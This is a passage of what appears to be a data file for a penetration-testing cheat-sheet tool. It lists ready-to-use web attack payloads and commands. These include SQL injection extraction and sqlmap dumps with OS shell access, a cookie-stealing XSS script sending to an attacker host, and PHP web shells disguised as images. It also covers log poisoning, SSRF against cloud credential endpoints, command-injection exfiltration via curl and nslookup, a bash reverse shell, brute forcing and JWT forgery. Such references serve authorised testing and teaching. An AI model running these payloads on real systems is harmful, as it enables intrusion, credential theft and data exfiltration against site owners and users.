        tags: ['web', 'sqli'],
                subtechniques: [
          {
            id: "sqd-man",
            name: "Manual Probes",
            commands: [
            { id: "sqd1", label: "Quote probes", os: "Both", command: "'\n\"\n`\n')--\n\"))--\n'--\n'#", notes: "Inject one at a time into every parameter. A SQL error or changed response = injection point." },
            { id: "sqd2", label: "Boolean difference test", os: "Both", command: "' AND 1=1-- -\n' AND 1=2-- -\n' AND 'a'='a\n' AND 'a'='b", notes: "If page differs between TRUE/FALSE payloads, boolean injection is confirmed." },
            { id: "sqd3", label: "Time-based confirmation", os: "Both", command: "' AND SLEEP(5)-- -\n' AND IF(1=1,SLEEP(5),0)-- -\n'; WAITFOR DELAY '0:0:5'-- -\n'; SELECT pg_sleep(5)-- -\n' AND 1=1 AND SLEEP(5)-- -", notes: "Page delay of ~5s confirms blind injection. First = MySQL, third = MSSQL, fourth = PostgreSQL." },
            { id: "sqd4", label: "DB engine fingerprint", os: "Both", command: "' AND 1=CONVERT(int,'a')-- -\n' AND extractvalue(1,concat(0x7e,version()))-- -\n' AND 1=(SELECT 1 FROM dual)-- -\n' AND version()>0-- -", notes: "\"Conversion failed\" = MSSQL. \"XPATH syntax error\" = MySQL. \"dual\" table = Oracle." },
            { id: "sqd5", label: "Comment style probes", os: "Both", command: "1-- -\n1#\n1/*comment*/\n1/*!50000 AND 1=1*/", notes: "-- and # = MySQL/MariaDB. Only -- = MSSQL/PostgreSQL/Oracle. /*!...*/ = MySQL version-specific." }
            ]
          },
          {
            id: "sqd-tool",
            name: "Header & Tool",
            commands: [
            { id: "sqd6", label: "Header-based injection test", os: "Linux", command: "curl -H \"X-Forwarded-For: 1'\" http://$$IP/\ncurl -A \"test' AND SLEEP(5)-- -\" http://$$IP/\ncurl -H \"Referer: http://x.com' AND 1=1-- -\" http://$$IP/\ncurl -b \"id=1' AND SLEEP(5)-- -\" http://$$IP/", notes: "Headers written to a DB (logging, analytics) are common injection points." },
            { id: "sqd7", label: "sqlmap banner + fingerprint", os: "Linux", command: "sqlmap -u '$$VULN_URL' --banner --current-user --current-db --hostname --batch", notes: "Confirms injection and immediately grabs DB version, current user, and DB name." }
            ]
          }
        ],
      },
      {
        id: 'web-sqli-union',
        name: 'SQLi — UNION-Based Extraction',
        description: 'Step-by-step UNION SELECT attack to extract data from any table when results are reflected in the page.',
        tags: ['web', 'sqli'],
                subtechniques: [
          {
            id: "squ-col",
            name: "Column Discovery",
            commands: [
            { id: "squ1", label: "1. Find column count (ORDER BY)", os: "Both", command: "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n' ORDER BY 4-- -", notes: "Increment until you get an error — column count = last working number." },
            { id: "squ2", label: "1b. Find column count (UNION NULL)", os: "Both", command: "' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL,NULL-- -", notes: "Add NULLs until no error. Works where ORDER BY is blocked." },
            { id: "squ3", label: "2. Find printable columns", os: "Both", command: "' UNION SELECT 'a',NULL,NULL-- -\n' UNION SELECT NULL,'a',NULL-- -\n' UNION SELECT NULL,NULL,'a'-- -", notes: "Replace NULL with 'a' one at a time to find which columns reflect string data in the page." }
            ]
          },
          {
            id: "squ-data",
            name: "Data Extraction",
            commands: [
            { id: "squ4", label: "3. Extract DB metadata", os: "Both", command: "' UNION SELECT @@version,NULL,NULL-- -\n' UNION SELECT user(),database(),@@datadir-- -\n' UNION SELECT @@version,DB_NAME(),SYSTEM_USER-- -", notes: "Adjust column count to match your target. First entry = MySQL, second line = MSSQL." },
            { id: "squ5", label: "4. List all databases", os: "Both", command: "' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -\n' UNION SELECT name,NULL FROM master..sysdatabases-- -", notes: "First = MySQL. Second = MSSQL." },
            { id: "squ6", label: "5. List tables", os: "Both", command: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='$$DB_NAME'-- -\n' UNION SELECT name,NULL FROM $$DB_NAME..sysobjects WHERE xtype='U'-- -", notes: "First = MySQL/PostgreSQL. Second = MSSQL." },
            { id: "squ7", label: "6. List columns", os: "Both", command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$$DB_TABLE' AND table_schema='$$DB_NAME'-- -\n' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('$$DB_TABLE')-- -", notes: "First = MySQL. Second = MSSQL." },
            { id: "squ8", label: "7. Dump data", os: "Both", command: "' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE-- -\n' UNION SELECT CONCAT(username,0x3a,password),NULL FROM $$DB_TABLE-- -\n' UNION SELECT username||':'||password,NULL FROM $$DB_TABLE-- -", notes: "0x3a = colon separator. Second = MySQL CONCAT. Third = PostgreSQL string concat." },
            { id: "squ9", label: "8. Pagination (LIMIT/OFFSET)", os: "Both", command: "' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE LIMIT 1 OFFSET 0-- -\n' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE LIMIT 1 OFFSET 1-- -", notes: "Extract one row at a time when only one result is reflected." }
            ]
          }
        ],
      },
      {
        id: 'web-sqli-error',
        name: 'SQLi — Error-Based Injection',
        description: 'Force the database to embed query results inside error messages, visible in the HTTP response.',
        tags: ['web', 'sqli'],
                subtechniques: [
          {
            id: "sqe-mysql",
            name: "MySQL",
            commands: [
            { id: "sqe1", label: "MySQL — extractvalue", os: "Both", command: "' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -\n' AND extractvalue(1,concat(0x7e,(SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1)))-- -", notes: "Output appears in the XPATH error: ~<value>. Limit = 31 chars per call." },
            { id: "sqe2", label: "MySQL — updatexml", os: "Both", command: "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -\n' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- -\n' AND updatexml(1,concat(0x7e,(SELECT group_concat($$DB_COLUMN) FROM $$DB_TABLE)),1)-- -", notes: "Same 31-char limit. Use group_concat to squeeze multiple values." },
            { id: "sqe3", label: "MySQL — floor/rand", os: "Both", command: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -", notes: "Triggers \"Duplicate entry\" error. Works on older MySQL where extractvalue is unavailable." }
            ]
          },
          {
            id: "sqe-mssql",
            name: "MSSQL & PostgreSQL",
            commands: [
            { id: "sqe4", label: "MSSQL — convert/cast", os: "Both", command: "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -\n' AND 1=CONVERT(int,(SELECT TOP 1 $$DB_COLUMN FROM $$DB_TABLE))-- -\n' AND 1=CAST((SELECT TOP 1 name FROM master..sysdatabases) AS int)-- -", notes: "\"Conversion failed when converting the varchar value...\" — data visible in error message." },
            { id: "sqe5", label: "MSSQL — HAVING / GROUP BY", os: "Both", command: "' HAVING 1=1-- -\n' GROUP BY columnname HAVING 1=1-- -", notes: "Reveals current table column names in error messages when the query uses GROUP BY." },
            { id: "sqe6", label: "PostgreSQL — cast error", os: "Both", command: "' AND CAST((SELECT version()) AS int)-- -\n' AND CAST((SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1) AS int)-- -", notes: "\"invalid input syntax for type integer: <value>\" — data in error." }
            ]
          }
        ],
      },
      {
        id: 'web-sqli-blind-bool',
        name: 'SQLi — Boolean Blind',
        description: 'Extract data one bit/character at a time by observing TRUE vs FALSE page differences.',
        tags: ['web', 'sqli'],
        commands: [
          { id: 'sqbb1', label: 'Confirm boolean control', os: 'Both', command: "' AND 1=1-- -\n' AND 1=2-- -", notes: 'Response MUST differ. If both look the same, use time-based blind instead.' },
          { id: 'sqbb2', label: 'Extract DB name (char by char)', os: 'Both', command: "' AND SUBSTRING(database(),1,1)='a'-- -\n' AND SUBSTRING(database(),1,1)='b'-- -\n' AND ASCII(SUBSTRING(database(),1,1))>64-- -\n' AND ASCII(SUBSTRING(database(),1,1))>96-- -", notes: 'Binary search on ASCII value is much faster than iterating a-z. Automate with Burp Intruder.' },
          { id: 'sqbb3', label: 'Extract table name (char by char)', os: 'Both', command: "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),1,1))>64-- -", notes: 'Change LIMIT offset to iterate through tables.' },
          { id: 'sqbb4', label: 'Extract column data (char by char)', os: 'Both', command: "' AND ASCII(SUBSTRING((SELECT $$DB_COLUMN FROM $$DB_TABLE LIMIT 1 OFFSET 0),1,1))>64-- -", notes: 'Change OFFSET to iterate through rows. Change position index for each character.' },
          { id: 'sqbb5', label: 'MSSQL substring', os: 'Both', command: "' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)='u'-- -\n' AND ASCII(SUBSTRING((SELECT TOP 1 $$DB_COLUMN FROM $$DB_TABLE),1,1))>64-- -", notes: 'MSSQL uses TOP 1 instead of LIMIT 1.' },
          { id: 'sqbb6', label: 'Automate with sqlmap (boolean)', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -p $$VULN_PARAM --technique=B --level 3 --batch", notes: '--technique=B forces boolean-only. Slower but stealthier.' },
        ],
      },
      {
        id: 'web-sqli-blind-time',
        name: 'SQLi — Time-Based Blind',
        description: 'Extract data via deliberate response delays when there is no visible output or boolean difference.',
        tags: ['web', 'sqli'],
        commands: [
          { id: 'sqbt1', label: 'Baseline delay confirm', os: 'Both', command: "' AND SLEEP(5)-- -\n'; WAITFOR DELAY '0:0:5'-- -\n'; SELECT pg_sleep(5)-- -\n' AND 1=1 AND SLEEP(1)-- -", notes: 'MySQL = SLEEP(). MSSQL = WAITFOR DELAY. PostgreSQL = pg_sleep(). Confirm before extracting.' },
          { id: 'sqbt2', label: 'Conditional delay (MySQL)', os: 'Both', command: "' AND IF(1=1,SLEEP(5),0)-- -\n' AND IF(database()='$$DB_NAME',SLEEP(5),0)-- -\n' AND IF(ASCII(SUBSTRING(database(),1,1))>96,SLEEP(3),0)-- -", notes: 'Delay only fires on TRUE condition — confirms each character.' },
          { id: 'sqbt3', label: 'Conditional delay (MSSQL)', os: 'Both', command: "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -\n'; IF (DB_NAME()='$$DB_NAME') WAITFOR DELAY '0:0:5'-- -\n'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1))>90) WAITFOR DELAY '0:0:3'-- -", notes: 'MSSQL stacked query for time control.' },
          { id: 'sqbt4', label: 'Conditional delay (PostgreSQL)', os: 'Both', command: "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -\n'; SELECT CASE WHEN (current_database()='$$DB_NAME') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -", notes: 'PostgreSQL CASE WHEN for conditional sleep.' },
          { id: 'sqbt5', label: 'Extract DB name via time', os: 'Both', command: "' AND IF(ASCII(SUBSTRING(database(),1,1))=97,SLEEP(3),0)-- -\n' AND IF(ASCII(SUBSTRING(database(),2,1))=100,SLEEP(3),0)-- -", notes: 'ASCII 97=a, 98=b, etc. Iterate position and value — automate with Burp Intruder or sqlmap.' },
          { id: 'sqbt6', label: 'Automate with sqlmap (time)', os: 'Linux', command: "sqlmap -u '$$VULN_URL' -p $$VULN_PARAM --technique=T --time-sec=3 --level 3 --batch", notes: '--technique=T forces time-based only. Increase --time-sec on slow connections.' },
        ],
      },
      {
        id: 'web-sqli-sqlmap-enum',
        name: 'SQLi — sqlmap Enumeration',
        description: 'Use sqlmap to automatically discover injection points and enumerate the database structure.',
        tags: ['web', 'sqli'],
                subtechniques: [
          {
            id: "sqme-req",
            name: "Request Setup",
            commands: [
            { id: "sqme1", label: "GET parameter", os: "Linux", command: "sqlmap -u '$$VULN_URL' --dbs --batch", notes: "Automatically detects and tests the GET parameters in the URL." },
            { id: "sqme2", label: "POST parameter", os: "Linux", command: "sqlmap -u 'http://$$IP/login' --data='user=admin&pass=test' -p $$VULN_PARAM --dbs --batch", notes: "-p specifies which POST param to test." },
            { id: "sqme3", label: "Cookie parameter", os: "Linux", command: "sqlmap -u 'http://$$IP/' --cookie='id=1; session=abc' -p id --dbs --batch", notes: "Test injectable values in cookies." },
            { id: "sqme4", label: "From Burp request file", os: "Linux", command: "sqlmap -r request.txt --dbs --batch", notes: "Save raw HTTP request from Burp (right-click → Save item). Most reliable method." },
            { id: "sqme5", label: "JSON body", os: "Linux", command: "sqlmap -u 'http://$$IP/api/items' --data='{\"id\":1}' --batch", notes: "sqlmap auto-detects JSON format. Use with API endpoints." }
            ]
          },
          {
            id: "sqme-enum",
            name: "Enumeration",
            commands: [
            { id: "sqme6", label: "Full enumeration (user, db, tables)", os: "Linux", command: "sqlmap -u '$$VULN_URL' --current-user --current-db --hostname --dbs --batch", notes: "Single command for full initial recon." },
            { id: "sqme7", label: "List tables in DB", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME --tables --batch", notes: "" },
            { id: "sqme8", label: "List columns in table", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --columns --batch", notes: "" },
            { id: "sqme9", label: "Increase aggressiveness", os: "Linux", command: "sqlmap -u '$$VULN_URL' --level 5 --risk 3 --dbs --batch", notes: "--level 5 tests all parameters including headers/cookies. --risk 3 enables heavy payloads." }
            ]
          }
        ],
      },
      {
        id: 'web-sqli-sqlmap-exploit',
        name: 'SQLi — sqlmap Data Extraction',
        description: 'Dump tables, read/write files, and escalate to OS command execution via sqlmap.',
        tags: ['web', 'sqli'],
                subtechniques: [
          {
            id: "sqmx-data",
            name: "Data Extraction",
            commands: [
            { id: "sqmx1", label: "Dump specific table", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE --dump --batch", notes: "" },
            { id: "sqmx2", label: "Dump specific columns", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE -C \"username,password\" --dump --batch", notes: "Faster — avoids downloading every column." },
            { id: "sqmx3", label: "Dump all tables in DB", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME --dump-all --batch", notes: "" },
            { id: "sqmx4", label: "Crack hashes after dump", os: "Linux", command: "sqlmap -u '$$VULN_URL' -D $$DB_NAME -T $$DB_TABLE -C \"username,password\" --dump --passwords --batch", notes: "--passwords also dumps DB auth hashes and attempts to crack them." }
            ]
          },
          {
            id: "sqmx-shell",
            name: "File & Shell",
            commands: [
            { id: "sqmx5", label: "Read file from server", os: "Linux", command: "sqlmap -u '$$VULN_URL' --file-read='/etc/passwd' --batch\nsqlmap -u '$$VULN_URL' --file-read='C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts' --batch", notes: "Requires FILE privilege (MySQL) or BULK INSERT rights (MSSQL)." },
            { id: "sqmx6", label: "Write file to server", os: "Linux", command: "sqlmap -u '$$VULN_URL' --file-write='./shell.php' --file-dest='/var/www/html/shell.php' --batch", notes: "Requires FILE privilege and write permission on target directory." },
            { id: "sqmx7", label: "Interactive SQL shell", os: "Linux", command: "sqlmap -u '$$VULN_URL' --sql-shell --batch", notes: "Interactive SQL prompt through the injection. Useful for manual queries." },
            { id: "sqmx8", label: "OS command execution", os: "Linux", command: "sqlmap -u '$$VULN_URL' --os-cmd='id' --batch\nsqlmap -u '$$VULN_URL' --os-shell --batch", notes: "--os-cmd for single command, --os-shell for interactive shell. Uses xp_cmdshell (MSSQL) or UDF (MySQL)." }
            ]
          }
        ],
      },
      {
        id: 'web-sqli-waf',
        name: 'SQLi — WAF & Filter Bypass',
        description: 'Techniques to evade web application firewalls, input filters, and blacklists.',
        tags: ['web', 'sqli'],
                subtechniques: [
          {
            id: "sqw-man",
            name: "Manual Bypass",
            commands: [
            { id: "sqw1", label: "Case variation", os: "Both", command: "SeLeCt\nunIOn sElEcT\nSELECT/**/1,2,3\nsElEcT 1,2,3", notes: "Many WAFs use case-sensitive matching. Mixed case bypasses simple keyword filters." },
            { id: "sqw2", label: "Comment injection", os: "Both", command: "SE/**/LECT\nUN/**/ION SE/**/LECT\n' UN/*comment*/ION SE/*comment*/LECT 1,2-- -\n' /*!UNION*/ /*!SELECT*/ 1,2-- -", notes: "/**/ breaks keywords for string-matching WAFs. /*!...*/ = MySQL version comment (still executes)." },
            { id: "sqw3", label: "URL / double encoding", os: "Both", command: "%27 = '\n%20 = space\n%23 = #\n%2527 = double-encoded '\n' %55NION %53ELECT-- -", notes: "Try URL encoding the entire payload or just special chars. Double-encoding bypasses single-decode WAFs." },
            { id: "sqw4", label: "Whitespace alternatives", os: "Both", command: "'%09UNION%09SELECT-- -\n'%0aUNION%0aSELECT-- -\n'%0dUNION%0dSELECT-- -\n' UNION(SELECT(1),(2),(3))-- -", notes: "%09=tab, %0a=newline, %0d=carriage return. Parentheses also eliminate spaces." },
            { id: "sqw5", label: "Alternate comment terminators", os: "Both", command: "-- -\n-- comment\n#\n--+\n;%00\n'/*", notes: "Some WAFs block -- but allow #. --+ URL-decoded = -- . Try all if one is blocked." }
            ]
          },
          {
            id: "sqw-tool",
            name: "sqlmap WAF",
            commands: [
            { id: "sqw6", label: "sqlmap tamper scripts", os: "Linux", command: "sqlmap -u '$$VULN_URL' --tamper=space2comment --batch\nsqlmap -u '$$VULN_URL' --tamper=between,space2comment,randomcase --batch\nsqlmap -u '$$VULN_URL' --tamper=charunicodeencode --batch\nsqlmap -u '$$VULN_URL' --tamper=apostrophemask --batch", notes: "Combine tamper scripts for layered evasion. List all: sqlmap --list-tampers" },
            { id: "sqw7", label: "sqlmap WAF detection + bypass", os: "Linux", command: "sqlmap -u '$$VULN_URL' --identify-waf --batch\nsqlmap -u '$$VULN_URL' --level 5 --risk 3 --random-agent --delay 2 --tamper=space2comment,between --batch", notes: "--random-agent rotates User-Agent. --delay avoids rate limiting." },
            { id: "sqw8", label: "HTTP parameter pollution", os: "Both", command: "http://$$IP/page.php?id=1&id=2\nhttp://$$IP/page.php?id=1 UNION&id= SELECT 1,2,3-- -", notes: "WAF may inspect only the first or last param; backend uses both. Split payload across duplicate params." }
            ]
          }
        ],
      },
      {
        id: 'web-xss',
        name: 'Cross-Site Scripting (XSS)',
        description: "Inject and execute malicious scripts in the context of a victim's browser.",
        tags: ['web', 'xss'],
                subtechniques: [
          {
            id: "xss-det",
            name: "Detection & Tools",
            commands: [
            { id: "xss1", label: "Basic reflected test", os: "Both", command: "<script>alert(1)</script>\n\"><script>alert(1)</script>\n'><script>alert(1)</script>", notes: "Try in all input fields and URL parameters." },
            { id: "xss2", label: "Cookie stealer payload", os: "Both", command: "<script>fetch('http://$$LHOST:$$LPORT/?c='+document.cookie)</script>", notes: "Start listener: nc -lvnp $$LPORT" },
            { id: "xss3", label: "dalfox scan", os: "Linux", command: "dalfox url \"http://$$IP/page.php?q=test\"", notes: "Automated XSS scanner with context-aware payloads." },
            { id: "xss4", label: "XSStrike", os: "Linux", command: "python3 XSStrike.py -u \"http://$$IP/page.php?q=test\" --crawl", notes: "Smart XSS detection with context analysis." }
            ]
          },
          {
            id: "xss-byp",
            name: "Bypass & DOM",
            commands: [
            { id: "xss5", label: "Filter bypass payloads", os: "Both", command: "<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\njava&#115;cript:alert(1)\n<ScRiPt>alert(1)</ScRiPt>", notes: "Use when <script> tags are filtered." },
            { id: "xss6", label: "DOM XSS sources", os: "Both", command: "document.URL\ndocument.location\ndocument.referrer\nwindow.location.hash\ndocument.cookie", notes: "Check if these flow into innerHTML / eval / document.write." }
            ]
          }
        ],
      },
      {
        id: 'web-lfi',
        name: 'LFI / Path Traversal',
        description: 'Read arbitrary files via directory traversal or local file inclusion, escalating to RCE where possible.',
        tags: ['web', 'lfi'],
                subtechniques: [
          {
            id: "lfi-read",
            name: "File Read",
            commands: [
            { id: "lfi1", label: "Basic traversal", os: "Both", command: "../../../etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n....//....//etc/passwd\n%2e%2e/%2e%2e/etc/passwd", notes: "Try in any filename/path parameter." },
            { id: "lfi2", label: "PHP base64 wrapper", os: "Both", command: "php://filter/convert.base64-encode/resource=index.php\nphp://filter/read=string.rot13/resource=config.php", notes: "Exfiltrate PHP source — decode the base64 output." },
            { id: "lfi3", label: "PHP input RCE", os: "Both", command: "php://input\n[POST body]: <?php system($_GET['cmd']); ?>", notes: "Works when allow_url_include=On." }
            ]
          },
          {
            id: "lfi-rce",
            name: "RCE & Brute",
            commands: [
            { id: "lfi4", label: "Log poisoning (Apache)", os: "Linux", command: "# 1. Poison User-Agent:\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://$$IP/\n# 2. Include the log:\nhttp://$$IP/page.php?file=/var/log/apache2/access.log&cmd=id", notes: "" },
            { id: "lfi5", label: "/proc/self/environ RCE", os: "Linux", command: "# Poison via User-Agent then include:\ncurl -A \"<?php system(\\$_GET['c']); ?>\" http://$$IP/\nhttp://$$IP/page.php?file=/proc/self/environ&c=id", notes: "" },
            { id: "lfi6", label: "ffuf LFI fuzz", os: "Linux", command: "ffuf -u \"http://$$IP/page.php?file=FUZZ\" -w $$WORDLIST -fs 0", notes: "" },
            { id: "lfi7", label: "RFI test", os: "Both", command: "http://$$IP/page.php?file=http://$$LHOST/shell.php\nhttp://$$IP/page.php?file=\\\\$$LHOST\\share\\shell.php", notes: "Requires allow_url_include=On. Host shell: python3 -m http.server 80" }
            ]
          }
        ],
      },
      {
        id: 'web-upload',
        name: 'File Upload Bypass',
        description: 'Bypass client-side and server-side upload restrictions to upload and execute malicious files.',
        tags: ['web', 'upload'],
        commands: [
          { id: 'upl1', label: 'Extension bypass list', os: 'Both', command: 'shell.php\nshell.PHP\nshell.php5\nshell.php7\nshell.phtml\nshell.pHp\nshell.PhP\nshell.php.jpg\nshell.jpg.php', notes: 'Try each — server may execute based on extension mapping.' },
          { id: 'upl2', label: 'Content-Type bypass', os: 'Both', command: '# Intercept in Burp, change:\nContent-Type: image/jpeg\n\n# Minimal PHP shell:\n<?php system($_GET["cmd"]); ?>', notes: 'Server-side filter may only check Content-Type header.' },
          { id: 'upl3', label: 'Magic bytes bypass', os: 'Linux', command: "# Prepend GIF magic bytes to PHP shell:\necho -e 'GIF89a\\n<?php system(\\$_GET[\"cmd\"]); ?>' > shell.php.gif\n# Add to existing image via exiftool:\nexiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.jpg -o shell.php.jpg", notes: '' },
          { id: 'upl4', label: '.htaccess override', os: 'Linux', command: '# Upload .htaccess first:\nAddType application/x-httpd-php .jpg\n# Then upload shell.jpg containing PHP code', notes: 'Only works if .htaccess is allowed and server is Apache.' },
          { id: 'upl5', label: 'Weevely shell', os: 'Linux', command: 'weevely generate $$PASSWORD shell.php\n# After upload:\nweevely http://$$IP/uploads/shell.php $$PASSWORD', notes: 'Obfuscated PHP shell with built-in post-exploit toolkit.' },
        ],
      },
      {
        id: 'web-ssrf',
        name: 'Server-Side Request Forgery (SSRF)',
        description: 'Trick the server into making requests to internal services or cloud metadata endpoints.',
        tags: ['web', 'ssrf'],
                subtechniques: [
          {
            id: "ssrf-int",
            name: "Internal & Cloud Metadata",
            commands: [
            { id: "ssrf1", label: "Basic internal access", os: "Both", command: "http://127.0.0.1/admin\nhttp://localhost/admin\nhttp://0.0.0.0/admin\nhttp://[::1]/admin\nhttp://10.0.0.1/\nhttp://192.168.1.1/", notes: "Inject into any URL parameter the server fetches." },
            { id: "ssrf2", label: "AWS metadata", os: "Both", command: "http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data/", notes: "Leaks IAM role credentials on AWS EC2." },
            { id: "ssrf3", label: "Azure metadata", os: "Both", command: "http://169.254.169.254/metadata/instance?api-version=2021-02-01\n# Required header: Metadata: true", notes: "" },
            { id: "ssrf4", label: "GCP metadata", os: "Both", command: "http://metadata.google.internal/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n# Required header: Metadata-Flavor: Google", notes: "" }
            ]
          },
          {
            id: "ssrf-byp",
            name: "Bypass & Blind",
            commands: [
            { id: "ssrf5", label: "Bypass filters", os: "Both", command: "http://2130706433/      (127.0.0.1 decimal)\nhttp://0x7f000001/      (127.0.0.1 hex)\nhttp://127.1/\nhttp://127.0.0.1.nip.io/\n0177.0.0.1             (octal)", notes: "Use when 127.0.0.1 and localhost are blocked." },
            { id: "ssrf6", label: "Blind SSRF (interactsh)", os: "Linux", command: "# Start listener:\ninteractsh-client\n# Inject your interactsh URL as the SSRF target:\nhttp://YOUR-ID.oast.fun/", notes: "Detects blind SSRF via DNS/HTTP callbacks." }
            ]
          }
        ],
      },
      {
        id: 'web-cmdi',
        name: 'Command Injection',
        description: 'Inject OS commands via unsanitised input that reaches shell execution functions.',
        tags: ['web', 'rce'],
                subtechniques: [
          {
            id: "cmdi-det",
            name: "Detection",
            commands: [
            { id: "cmdi1", label: "Injection characters", os: "Both", command: "; id\n| id\n&& id\n`id`\n$(id)\n|| id", notes: "Append to or replace normal input values." },
            { id: "cmdi2", label: "Blind — ping test", os: "Both", command: "; ping -c 4 $$LHOST\n| ping -c 4 $$LHOST", notes: "Capture: tcpdump -i tun0 icmp" },
            { id: "cmdi3", label: "Blind — OOB exfil", os: "Both", command: "; curl http://$$LHOST/?cmd=$(id|base64)\n; nslookup $(whoami).$$LHOST", notes: "Exfiltrate data via HTTP or DNS." }
            ]
          },
          {
            id: "cmdi-exp",
            name: "Exploitation",
            commands: [
            { id: "cmdi4", label: "Filter bypass", os: "Both", command: "c$()at /etc/passwd\nc\\at /etc/passwd\n/???/c?t /etc/passwd\n{cat,/etc/passwd}\n# Replace spaces with ${IFS}", notes: "Use when spaces or key chars are filtered." },
            { id: "cmdi5", label: "commix scan", os: "Linux", command: "commix -u \"http://$$IP/page.php?input=test\" --all", notes: "Automated command injection exploitation framework." },
            { id: "cmdi6", label: "Reverse shell", os: "Linux", command: "bash -c \"bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1\"", notes: "URL-encode before injecting via a web parameter." }
            ]
          }
        ],
      },
      {
        id: 'web-auth',
        name: 'Broken Authentication',
        description: 'Attack login forms, session tokens, JWTs, and credential management weaknesses.',
        tags: ['web', 'auth'],
                subtechniques: [
          {
            id: "auth-brute",
            name: "Brute Force",
            commands: [
            { id: "auth1", label: "Default credentials", os: "Both", command: "admin:admin\nadmin:password\nadmin:1234\nroot:root\nguest:guest\ntest:test\nadmin:(blank)", notes: "Always try before brute-forcing." },
            { id: "auth2", label: "Hydra HTTP form brute", os: "Linux", command: "hydra -L users.txt -P $$WORDLIST $$IP http-post-form \"/login:username=^USER^&password=^PASS^:Invalid credentials\"", notes: "Adjust POST params and failure string to match the target." },
            { id: "auth3", label: "ffuf login brute", os: "Linux", command: "ffuf -u http://$$IP/login -X POST -d \"user=admin&pass=FUZZ\" -w $$WORDLIST -fc 302", notes: "-fc 302 filters redirects (wrong password response)." }
            ]
          },
          {
            id: "auth-jwt",
            name: "JWT Attacks",
            commands: [
            { id: "auth4", label: "JWT decode", os: "Linux", command: "echo 'eyJ...' | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .", notes: "Or paste at jwt.io to inspect header and payload." },
            { id: "auth5", label: "JWT none algorithm", os: "Both", command: "# Set alg to none, remove signature:\nHeader: {\"alg\":\"none\",\"typ\":\"JWT\"}\nPayload: {\"sub\":\"admin\",\"role\":\"admin\"}\n# Token = base64(header).base64(payload).", notes: "Some libraries accept unsigned tokens when alg=none." },
            { id: "auth6", label: "JWT secret brute", os: "Linux", command: "hashcat -m 16500 'eyJ...full.token.here' $$WORDLIST", notes: "Mode 16500 = JWT HMAC-SHA256. Use cracked secret to forge tokens." },
            { id: "auth7", label: "JWT kid path traversal", os: "Both", command: "# Set kid to a controlled file:\nHeader: {\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}\n# Sign with empty string as secret", notes: "If kid resolves to /dev/null, the secret becomes empty string." }
            ]
          }
        ],
      },
      {
        id: 'web-idor',
        name: 'IDOR / Broken Access Control',
        description: 'Access objects or functions restricted to other users or higher privilege levels.',
        tags: ['web', 'idor'],
                subtechniques: [
          {
            id: "idor-param",
            name: "Parameter Manipulation",
            commands: [
            { id: "idor1", label: "IDOR fuzz IDs", os: "Linux", command: "ffuf -u 'http://$$IP/api/user/FUZZ/profile' -w <(seq 1 1000) -mc 200", notes: "Also try GUIDs/UUIDs found in earlier responses." },
            { id: "idor2", label: "Forced browsing", os: "Linux", command: "ffuf -u http://$$IP/FUZZ -w $$WORDLIST -mc 200", notes: "Find unlinked admin pages and sensitive files." },
            { id: "idor3", label: "HTTP method override", os: "Both", command: "X-HTTP-Method-Override: DELETE\nX-HTTP-Method-Override: PUT\n# Or via URL param: ?_method=DELETE", notes: "Some servers respect override headers even when the method is blocked." }
            ]
          },
          {
            id: "idor-priv",
            name: "Privilege Escalation",
            commands: [
            { id: "idor4", label: "Mass assignment test", os: "Both", command: "{\"username\":\"user\",\"role\":\"admin\"}\n{\"username\":\"user\",\"isAdmin\":true}\n{\"username\":\"user\",\"balance\":99999}", notes: "Add privileged fields to POST/PUT body — framework may bind them." },
